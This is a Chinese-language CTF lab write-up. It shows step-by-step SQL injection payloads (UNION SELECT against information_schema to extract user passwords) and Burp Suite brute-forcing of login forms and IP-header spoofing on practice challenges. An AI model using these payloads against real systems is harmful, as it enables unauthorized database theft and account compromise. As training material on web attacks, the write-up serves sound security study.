一.GET型——注入

打开http://10.21.13.153:40000/sql.php?id=1

第一步.判断注入点

输入=1，查询成功 <br>输入1'and'1'='2,查询失败 <br>输入1’or'1'='1,查询成功，说明存在字符型注入

第二步.判断字段数

输入1' or 1=1 order by 1 #，查询成功

<br>输入1' or 1=1 order by 2 #，查询成功

<br>输入1' or 1=1 order by 3 #，查询失败，

说明只有两个字段

第三步.确定字段顺序

输入1'union select 1,2 #，查询成功

第四步.获取当前数据库

输入1'union select 1,database() #，查询成功

说明数据库名为zz

第五步.获取数据库中的表

输入1'union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功

第六步.获取表中的字段名

输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功

第七步.获取数据

输入1'or 1=1 union select group_concat(id,first_name,last_name),group_concat(password) from users #，查询成功

获得结果

三.应用burp suite尝试暴破

题目一：http://ctf4.shiyanbar.com/web/root/index.php

  1. 查看源代码，发现代码中存在隐藏文件“password.txt"
![](https://i.imgur.com/DysIl6Z.png)

  1. 修改URL，打开root目录下的password.txt文件

  2. 保存文件于本地，说明flag就在文件中

  3. 返回原网页，打开代理，在form中任意输入字符，便于在burpsuite中找到破解点

    输入：1234，找到破解点

  4. send to intruder,在positions选中破解位置

  5. 进入payloads,以simple list形式load...刚才保存的文件

  6. start attack

  7. 获得加载结果，根据不同加载量得到password:Nsf0cuS

  8. 发现网页中最多只能输入五个字符，重新拦截，直接在代理界面修改password为Nsf0cuS，forward,获得flag:这里没有flag哦 ！

题目二：only localhost can get flaghttp://10.21.13.153:20075/

  1. 打开网页显示：only localhost can get flag
  1. 抓包后伪造IP地址127.0.0.1，发现only chinese can get the flag IP地址伪造参考链接：https://www.jianshu.com/p/98c08956183d
  2. 修改Accept-Language为chinese,得到flag:ZJGSCTF{y3s!I7_i3_s0_e4sy!

题目三：密码爆破http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php

与题一相似，利用burpsuite抓包拦截，选中password破解部分，根据题意，password为四位纯数字数且第一位不为0，因此选择payload type为numbers,范围在1000-9999

暴力破解，得到password:1238

输入password&&vcode,得到flag:LJLJL789sdf#@sd
